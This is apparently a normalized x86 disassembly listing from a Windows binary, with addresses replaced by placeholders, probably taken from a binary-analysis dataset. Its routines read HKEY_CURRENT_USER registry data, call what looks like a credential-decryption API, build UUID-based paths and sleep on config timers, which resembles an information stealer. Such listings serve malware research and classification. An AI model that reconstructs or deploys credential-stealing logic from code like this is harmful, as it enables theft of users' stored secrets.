mov eax [ ebp - 0xa64 ]
add eax [ ebp - 0x4 ]
xor edx edx
push 0x4
pop esi
div esi
mov [ ebp + edx * 4 - 0x638 ] ecx
mov eax [ ebp - 0xa5c ]
imul eax eax 0xbc8f
mov [ ebp - 0xa5c ] eax
jmp r-xdata
cmp [ ebp - 0xa68 ] 0x4
jge r-xdata
mov eax [ ebp - 0xa64 ]
inc eax
mov [ ebp - 0xa64 ] eax
mov eax [ ebp - 0x624 ]
movzx eax [ eax ]
test eax eax
je r-xdata
mov eax [ ebp - 0x624 ]
movzx eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0xa40 ] 0x10
lea eax [ ebp - 0x638 ]
mov [ ebp - 0xa3c ] eax
mov eax [ ebp - 0xa50 ]
lea ecx [ ebp - 0xa38 ]
sub eax ecx
mov [ ebp - 0xa58 ] eax
lea eax [ ebp - 0xa38 ]
mov [ ebp - 0xa54 ] eax
lea eax [ ebp - 0xa48 ]
push eax
push 0x1
push 0x0
push 0x0
lea eax [ ebp - 0xa40 ]
push eax
push 0x0
lea eax [ ebp - 0xa58 ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x624 ]
movzx eax [ eax + 0x2 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x624 ]
inc eax
inc eax
mov [ ebp - 0x624 ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
dec eax
push eax
push [ ebp + 0x10 ]
push [ ebp - 0xa48 ]
push [ ebp - 0xa44 ]
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x10 ]
and [ ecx + eax * 2 ] 0x0
push [ ebp - 0xa44 ]
call [ LocalFree@IAT ]
mov eax [ ebp - 0xa50 ]
cmp eax [ ebp - 0x628 ]
jae r-xdata
mov eax [ ebp - 0xa68 ]
inc eax
mov [ ebp - 0xa68 ] eax
mov eax [ ebp - 0x624 ]
movzx eax [ eax ]
dec eax
shl eax 0x4
mov ecx [ ebp - 0x624 ]
movzx ecx [ ecx + 0x2 ]
sub ecx 0x21
or eax ecx
movzx ecx [ ebp - 0xa49 ]
sub eax ecx
mov ecx [ ebp - 0xa50 ]
mov [ ecx ] al
mov eax [ ebp - 0xa50 ]
inc eax
mov [ ebp - 0xa50 ] eax
mov eax [ ebp - 0x624 ]
add eax 0x4
mov [ ebp - 0x624 ] eax
movzx eax [ ebp - 0xa49 ]
imul eax eax 0xf5
mov [ ebp - 0xa49 ] al
jmp r-xdata
sub_41613f
push ebp
mov ebp esp
mov eax 0x3014
call sub_40a0e0
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2010 ] eax
mov [ ebp - 0x8 ] 0x1000
mov [ ebp - 0x4 ] 0x1000
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2008 ]
push eax
push r--data
push [ ebp + 0x8 ]
mov edx 0x80000001
mov ecx [ ebp - 0x2010 ]
call sub_41017c
movzx eax al
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x3010 ]
push eax
push r--data
push [ ebp + 0x8 ]
mov edx 0x80000001
mov ecx [ ebp - 0x2010 ]
call sub_41017c
movzx eax al
test eax eax
jne r-xdata
mov al 0x1
jmp r-xdata
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
lea eax [ ebp - 0x2008 ]
push eax
push [ ebp - 0x2010 ]
call sub_415e14
add esp 0x10
test eax eax
jg r-xdata
and [ ebp - 0x3010 ] 0x0
leave
retn
push [ ebp + 0x8 ]
call [ lstrlenW@IAT ]
mov [ ebp - 0x3014 ] eax
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x3014 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax * 2 + 0x2 ]
mov [ ebp - 0x200c ] eax
push r--data
lea eax [ ebp - 0x3010 ]
push eax
push r--data
lea eax [ ebp - 0x1008 ]
push eax
push [ ebp - 0x200c ]
mov edx r--data
mov ecx [ ebp - 0x2010 ]
call sub_414e54
mov al 0x1
cmp [ ebp - 0x3014 ] 0x0
jl r-xdata
jmp r-xdata
mov eax [ ebp - 0x3014 ]
dec eax
mov [ ebp - 0x3014 ] eax
mov eax [ ebp - 0x3014 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ ecx + eax * 2 ]
cmp eax 0x5c
je r-xdata
sub_41626d
push ebp
mov ebp esp
mov eax 0x4020
call sub_40a0e0
mov [ ebp - 0x1008 ] 0x1000
mov [ ebp - 0x2014 ] 0x1000
mov [ ebp - 0x1004 ] 0x1000
lea eax [ ebp - 0x1008 ]
push eax
lea eax [ ebp - 0x4018 ]
push eax
push r--data
push r--data
mov edx 0x80000001
mov ecx [ ebp + 0x8 ]
call sub_41017c
movzx eax al
test eax eax
jne r-xdata
lea eax [ ebp - 0x2014 ]
push eax
lea eax [ ebp - 0x2008 ]
push eax
push r--data
push r--data
mov edx 0x80000001
mov ecx [ ebp + 0x8 ]
call sub_41017c
movzx eax al
test eax eax
jne r-xdata
xor al al
jmp r-xdata
lea eax [ ebp - 0x1004 ]
push eax
lea eax [ ebp - 0x3018 ]
push eax
push r--data
push r--data
mov edx 0x80000001
mov ecx [ ebp + 0x8 ]
call sub_41017c
movzx eax al
test eax eax
jne r-xdata
xor al al
jmp r-xdata
leave
retn
mov eax [ ebp - 0x2014 ]
mov [ ebp - 0x4020 ] eax
lea eax [ ebp - 0x2008 ]
mov [ ebp - 0x401c ] eax
lea eax [ ebp - 0x2010 ]
push eax
push 0x1
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4020 ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
xor al al
jmp r-xdata
xor al al
jmp r-xdata
push [ ebp - 0x2010 ]
push [ ebp - 0x200c ]
lea eax [ ebp - 0x1000 ]
push eax
call sub_402b50
add esp 0xc
push [ ebp - 0x200c ]
call [ LocalFree@IAT ]
jmp r-xdata
push r--data
push r--data
lea eax [ ebp - 0x3018 ]
push eax
lea eax [ ebp - 0x1000 ]
push eax
lea eax [ ebp - 0x4018 ]
push eax
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_414e54
mov al 0x1
sub_4163c8
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push sub_41613f
push 0x0
push 0x1
push r--data
mov edx 0x80000001
mov ecx [ ebp + 0x8 ]
call sub_40feb4
mov al 0x1
pop ebp
retn
sub_4163ed
push ebp
mov ebp esp
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call sub_41626d
pop ecx
push [ ebp + 0x8 ]
call sub_4163c8
pop ecx
mov al 0x1
xor al al
jmp r-xdata
pop ebp
retn
sub_41642a
push ebp
mov ebp esp
sub esp 0x6c
mov [ ebp - 0xd ] 0x0
mov [ ebp - 0xc ] 0x1
movzx eax [ ebp + 0x14 ]
test eax eax
je r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
push 0x0
call [ rw-data ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
dec eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jg r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
movzx eax [ ebp - 0xd ]
test eax eax
jne r-xdata
push 0x48
lea eax [ ebp - 0x60 ]
push eax
call sub_40103d
pop ecx
pop ecx
push 0x0
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push [ ebp - 0x4 ]
call [ eax + 0x30 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x58 ] 0x0
jbe r-xdata
mov al [ ebp - 0xd ]
leave
retn
mov eax [ ebp + 0x10 ]
and [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push [ ebp - 0x4 ]
call [ eax + 0x8 ]
cmp [ ebp - 0x58 ] 0x200000
jae r-xdata
mov [ ebp - 0x6c ] 0x200000
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x6c ] eax
jmp r-xdata
mov eax [ ebp - 0x68 ]
cmp eax [ ebp - 0x58 ]
jb r-xdata
lea eax [ ebp - 0x64 ]
push eax
push [ ebp - 0x14 ]
mov eax [ ebp + 0xc ]
add eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push [ ebp - 0x4 ]
call [ eax + 0xc ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x1
jne r-xdata
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x58 ] eax
and [ ebp - 0x64 ] 0x0
and [ ebp - 0x68 ] 0x0
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x68 ]
mov [ eax ] ecx
mov [ ebp - 0xd ] 0x1
and [ ebp - 0xc ] 0x0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x64 ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x8000000a
je r-xdata
mov eax [ ebp - 0x68 ]
add eax [ ebp - 0x64 ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x64 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x68 ]
cmp eax [ ebp - 0x58 ]
jae r-xdata
sub_416566
push ebp
mov ebp esp
mov eax 0x8110
call sub_40a0e0
lea eax [ ebp - 0x8110 ]
push eax
call [ UuidCreate@IAT ]
and [ ebp - 0x80 ] 0x0
movzx eax [ ebp - 0x8101 ]
push eax
movzx eax [ ebp - 0x8102 ]
push eax
movzx eax [ ebp - 0x8103 ]
push eax
movzx eax [ ebp - 0x8104 ]
push eax
movzx eax [ ebp - 0x8105 ]
push eax
movzx eax [ ebp - 0x8106 ]
push eax
movzx eax [ ebp - 0x8107 ]
push eax
movzx eax [ ebp - 0x8108 ]
push eax
movzx eax [ ebp - 0x810a ]
push eax
movzx eax [ ebp - 0x810c ]
push eax
push [ ebp - 0x8110 ]
push r--data
lea eax [ ebp - 0x80 ]
push eax
call [ wsprintfW@IAT ]
add esp 0x34
push 0x8000
lea eax [ ebp - 0x8080 ]
push eax
call sub_40103d
pop ecx
pop ecx
push [ ebp + 0x18 ]
lea eax [ ebp - 0x8080 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x8080 ]
push eax
call [ lstrcatW@IAT ]
push [ rw-data ]
push r--data
lea eax [ ebp - 0x8100 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x8100 ]
push eax
lea eax [ ebp - 0x8080 ]
push eax
call [ lstrcatW@IAT ]
push [ rw-data ]
push [ rw-data ]
push r--data
lea eax [ ebp - 0x8100 ]
push eax
call [ wsprintfW@IAT ]
add esp 0x10
lea eax [ ebp - 0x8100 ]
push eax
lea eax [ ebp - 0x8080 ]
push eax
call [ lstrcatW@IAT ]
push [ ebp + 0xc ]
push r--data
lea eax [ ebp - 0x8100 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x8100 ]
push eax
lea eax [ ebp - 0x8080 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x80 ]
push eax
push r--data
lea eax [ ebp - 0x8100 ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x8100 ]
push eax
lea eax [ ebp - 0x8080 ]
push eax
call [ lstrcatW@IAT ]
mov eax [ ebp + 0x14 ]
push [ eax ]
push [ ebp + 0x10 ]
call sub_40103d
pop ecx
pop ecx
push 0x1
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x8080 ]
push eax
call sub_41642a
add esp 0x10
leave
retn
sub_416707
push ebp
mov ebp esp
push 0xffffffff
push sub_423c40
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x80
lea ecx [ ebp - 0x2c ]
call sub_416c24
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
call sub_401577
mov [ rw-data ] eax
mov ecx [ ebp + 0x8 ]
call sub_4115ed
mov [ rw-data ] eax
mov [ rw-data ] edx
and [ ebp - 0x30 ] 0x0
mov [ ebp - 0x3d ] 0x0
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov al [ ebp - 0x3d ]
mov [ ebp - 0x81 ] al
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_416bd2
mov al [ ebp - 0x81 ]
mov eax [ ebp - 0x30 ]
inc eax
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x50 ] 0x40211202
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call sub_41e8dd
mov ecx eax
call sub_41e779
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x4 ] 0x1
push [ ebp - 0x8c ]
lea ecx [ ebp - 0x2c ]
call sub_40186c
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x70 ]
call sub_416bd2
lea ecx [ ebp - 0x2c ]
call sub_416938
movzx eax al
test eax eax
je r-xdata
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ ebp - 0x45 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_416bd2
mov al [ ebp - 0x45 ]
jmp r-xdata
mov [ ebp - 0x78 ] 0x703295f9
push 0x1
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_416b05
mov [ ebp - 0x7c ] 0x7f4becad
push 0x1
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x7c ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_416b65
mov [ ebp - 0x80 ] 0x69b8e0a0
push 0x1
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_416b65
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x71 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_416bd2
mov al [ ebp - 0x71 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
push [ ebp - 0x44 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x64
push [ ebp + 0x8 ]
call sub_416566
add esp 0x14
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x3d ] 0x1
jmp r-xdata
movzx eax [ ebp - 0x3d ]
test eax eax
jne r-xdata
mov [ ebp - 0x3d ] 0x1
and [ ebp - 0x38 ] 0x0
xor eax eax
inc eax
je r-xdata
jmp r-xdata
movzx eax [ ebp - 0x3d ]
test eax eax
je r-xdata
mov eax [ ebp - 0x38 ]
inc eax
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x38 ]
cmp eax [ ebp - 0x3c ]
jle r-xdata
mov eax [ ebp - 0x34 ]
imul eax eax 0x3e8
push eax
call [ Sleep@IAT ]
movzx eax [ ebp - 0x3d ]
test eax eax
jne r-xdata
push [ ebp - 0x44 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x65
push [ ebp + 0x8 ]
call sub_416566
add esp 0x14
movzx eax al
test eax eax
je r-xdata
jmp r-xdata
jmp r-xdata
xor eax eax
inc eax
je r-xdata
sub_416938
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_401000
xor edx edx
push 0xd
pop ecx
div ecx
test eax eax
jne r-xdata
xor al al
mov al 0x1
jmp r-xdata
leave
retn
sub_41695a
push ebp
mov ebp esp
sub esp 0x2c
mov [ ebp - 0x2c ] ecx
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0xd ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov al [ ebp + 0xc ]
mov [ ebp - 0x24 ] al
mov ecx [ ebp - 0x2c ]
call sub_401000
xor edx edx
push 0xd
pop ecx
div ecx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
leave
retn 0xc
mov ecx [ ebp - 0x2c ]
call sub_40100f
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0xd
add eax ecx
mov [ ebp - 0xc ] eax
push [ ebp - 0xc ]
lea ecx [ ebp - 0x28 ]
call sub_401661
movzx eax al
test eax eax
je r-xdata
movzx eax [ ebp - 0xd ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
inc eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
mov [ ebp - 0xd ] 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
sub_4169f7
push ebp
mov ebp esp
sub esp 0x2c
push esi
push edi
mov [ ebp - 0x2c ] ecx
mov ecx [ ebp + 0x8 ]
call sub_401000
xor edx edx
push 0xd
pop ecx
div ecx
mov [ ebp - 0xc ] eax
and [ ebp - 0x8 ] 0x0
mov al 0x1
pop edi
pop esi
leave
retn 0x4
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0x8 ]
call sub_40100f
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0xd
add eax ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
mov eax [ ebp - 0x24 ]
inc eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_40100f
mov ecx [ ebp - 0x28 ]
imul ecx ecx 0xd
add eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov eax [ eax ]
cmp eax [ ecx ]
jne r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp [ ebp - 0x8 ] eax
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0x20 ]
movzx eax [ eax + 0x4 ]
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx + 0x4 ]
cmp eax ecx
jne r-xdata
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x24 ]
inc eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0x24 ]
jne r-xdata
mov esi [ ebp - 0x24 ]
sub esi [ ebp - 0x8 ]
imul esi esi 0xd
add esi [ ebp - 0x4 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0xd
push [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x8 ]
imul eax eax 0xd
add eax [ ebp - 0x4 ]
push eax
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x13 ]
mov [ eax + 0x9 ] ecx
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x17 ]
mov [ eax + 0x5 ] ecx
mov eax [ ebp - 0x20 ]
mov cl [ ebp - 0x18 ]
mov [ eax + 0x4 ] cl
jmp r-xdata
sub_416b05
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0xc ]
and [ eax ] 0x0
push [ ebp + 0x10 ]
push 0x6
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
call sub_41695a
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x10
call sub_40100f
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x9 ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov al 0x1
push [ ebp + 0x10 ]
push 0x6
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
call sub_41695a
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
leave
retn 0xc
sub_416b65
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
call sub_41695a
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5 ] 0x4
je r-xdata
xor al al
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x9 ]
mov [ eax ] ecx
mov al 0x1
mov eax [ ebp + 0xc ]
and [ eax ] 0x0
xor al al
jmp r-xdata
leave
retn 0xc
sub_416bd2
push ebp
mov ebp esp
push 0xffffffff
push sub_423929
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x10 ]
call sub_416bb4
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x10 ]
add ecx 0x10
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0x10 ]
call sub_4010a3
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_416c24
push ebp
mov ebp esp
push 0xffffffff
push sub_423946
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x10 ]
call sub_401068
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x10 ]
add ecx 0x10
call sub_401068
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x10 ]
call sub_416bb4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_416c76
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
call sub_4106f0
push [ ebp + 0x10 ]
push 0x8
lea eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_41695a
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
push [ eax + 0x5 ]
mov ecx [ ebp - 0x8 ]
add ecx 0x10
call sub_40100f
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x9 ]
push eax
mov ecx [ ebp + 0xc ]
call sub_410811
mov al 0x1
xor al al
jmp r-xdata
leave
retn 0xc
sub_416ccc
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
call sub_4106f0
push [ ebp + 0x10 ]
push 0x7
lea eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_41695a
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
push [ eax + 0x5 ]
mov ecx [ ebp - 0x8 ]
add ecx 0x10
call sub_40100f
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x9 ]
push eax
mov ecx [ ebp + 0xc ]
call sub_410811
mov al 0x1
xor al al
jmp r-xdata
leave
retn 0xc
sub_416d22
push ebp
mov ebp esp
sub esp 0x34
mov [ ebp - 0x2c ] ecx
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x11 ] 0x1
mov ecx [ ebp + 0x8 ]
call sub_40100f
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
call sub_401000
mov ecx [ ebp - 0x8 ]
cmp [ ecx ] eax
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0x8
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x24 ]
add eax 0x8
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x2c ]
call sub_4106f0
mov ecx [ ebp - 0x2c ]
add ecx 0x10
call sub_4106f0
xor al al
jmp r-xdata
push [ ebp - 0x2c ]
mov ecx [ ebp - 0x2c ]
call sub_4169f7
mov al 0x1
mov eax [ ebp - 0x28 ]
cmp [ eax ] 0xffffffff
je r-xdata
leave
retn 0x4
cmp [ ebp - 0x1c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x1c ]
sub ecx [ eax ]
cmp ecx 0xd
jae r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x18 ]
mov eax [ eax ]
cmp eax [ ecx ]
ja r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x4
mov ecx [ ebp - 0x1c ]
sub ecx eax
mov [ ebp - 0x1c ] ecx
mov eax [ ebp - 0x28 ]
add eax 0x4
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x28 ]
add eax 0x4
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x24 ]
add ecx [ eax ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x20 ] 0xd
mov eax [ ebp - 0x10 ]
mov al [ eax + 0x4 ]
mov [ ebp - 0x30 ] al
cmp [ ebp - 0x30 ] 0x0
jb r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp ecx [ eax + 0x4 ]
jge r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + 0x4 ]
mov [ ebp - 0x34 ] al
cmp [ ebp - 0x34 ] 0x6
je r-xdata
cmp [ ebp - 0x30 ] 0x1
jbe r-xdata
push 0x0
push 0x2
push r--data
mov ecx [ ebp - 0x2c ]
add ecx 0x10
call sub_410811
jmp r-xdata
push 0x0
push 0xd
push [ ebp - 0x10 ]
mov ecx [ ebp - 0x2c ]
call sub_410811
jmp r-xdata
cmp [ ebp - 0x30 ] 0x1
jbe r-xdata
cmp [ ebp - 0x30 ] 0x4
jbe r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x20 ]
add ecx [ eax + 0x5 ]
mov [ ebp - 0x20 ] ecx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x20 ]
add ecx [ eax ]
cmp ecx [ ebp - 0x1c ]
jbe r-xdata
cmp [ ebp - 0x30 ] 0x5
je r-xdata
mov ecx [ ebp - 0x2c ]
add ecx 0x10
call sub_401000
mov [ ebp - 0xc ] eax
push 0x0
mov eax [ ebp - 0x10 ]
push [ eax + 0x5 ]
mov eax [ ebp - 0x10 ]
add eax 0xd
push eax
mov ecx [ ebp - 0x2c ]
add ecx 0x10
call sub_410811
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x9 ] ecx
push 0x0
push 0xd
push [ ebp - 0x10 ]
mov ecx [ ebp - 0x2c ]
call sub_410811
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ eax + 0x4 ] 0x6
cmp [ ebp - 0x30 ] 0x5
jbe r-xdata
cmp [ ebp - 0x30 ] 0x8
jbe r-xdata
jmp r-xdata
sub_416efe
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x18 ] ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn 0x10
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov al [ ebp + 0xc ]
mov [ ebp - 0xc ] al
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xb ] eax
mov al [ ebp + 0xc ]
mov [ ebp - 0x1c ] al
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x7 ] eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x1
je r-xdata
push 0x0
push 0xd
lea eax [ ebp - 0x10 ]
push eax
